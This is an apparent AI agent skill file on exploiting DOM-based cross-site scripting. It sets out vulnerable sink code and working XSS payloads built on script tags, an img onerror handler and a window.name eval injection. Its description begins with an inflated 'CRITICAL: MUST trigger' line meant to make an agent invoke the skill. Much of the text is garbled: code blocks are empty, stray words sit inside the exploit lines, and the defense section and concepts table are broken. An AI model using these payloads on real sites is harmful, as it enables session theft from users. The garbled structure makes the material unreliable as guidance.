---
name: dom-based-xss
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Exploit Document Object Model (DOM) Based Cross-Site Scripting (XSS) vulnerabilities. Unlike 
  Reflected or Stored XSS, the attack payload is executed purely on the client-side as a result 
  of modifying the DOM environment, often without the payload ever reaching the backend server.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0001, TA0005]
  techniques: [T1189, T1059.007]
platforms: [web]
tags: [xss, dom, javascript, web-security, bug-hunting, client-side]
tools: [browser-dev-tools, burp-suite, dom-invader]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# DOM-Based XSS

## When to Use
- When auditing modern Single Page Applications (SPAs) built with frameworks like React, Angular, or purely complex vanilla JavaScript.
- When searching for client-side vulnerabilities where user input is processed directly in the browser (e.g., via `location.hash`, `window.name`, or `document.referrer`).

## Workflow

### Phase 1: Understanding DOM XSS

```text
# Concept: DOM XSS ```

### Phase 2: Identifying Sources and Sinks

```text
# Common Sources ```

### Phase 3: Exploitation Examples

```javascript
# Example 1: `document.write` // VULNERABLE CODE let query = new URLSearchParams(window.location.search).get('q');
document.write("Results for: " + query); // SINK

// EXPLOIT target.com/search?q=<script>alert(1)</script>


# Example 2: `innerHTML` VULNERABLE CODE let hash = window.location.hash.slice(1);
document.getElementById('profile').innerHTML = decodeURIComponent(hash); // SINK

// EXPLOIT intelligenty // target.com/#<img%20src=x%20onerror=alert(document.domain)>


# Example 3: `eval()` VULNERABLE CODE let data = window.name;
eval("var x = " + data); // SINK

// EXPLOIT superbly // window.name = "1; alert('XSS') //";
// window.location = "http://target.com/vuln";
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Map Sources ] --> B{Valid Sink? ]}
    B -->|Yes| C[Craft Payload ]
    B -->|No| D[Find Others ]
    C --> E[Execute ]
```

## 🔵 Blue Team Detection & Defense
- **Context-Aware Encoding**: **Safe APIs**: Key Concepts
| Concept | Description |
|---------|-------------|
| DOM Source | |
| DOM Sink | |

## References
- PortSwigger: [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
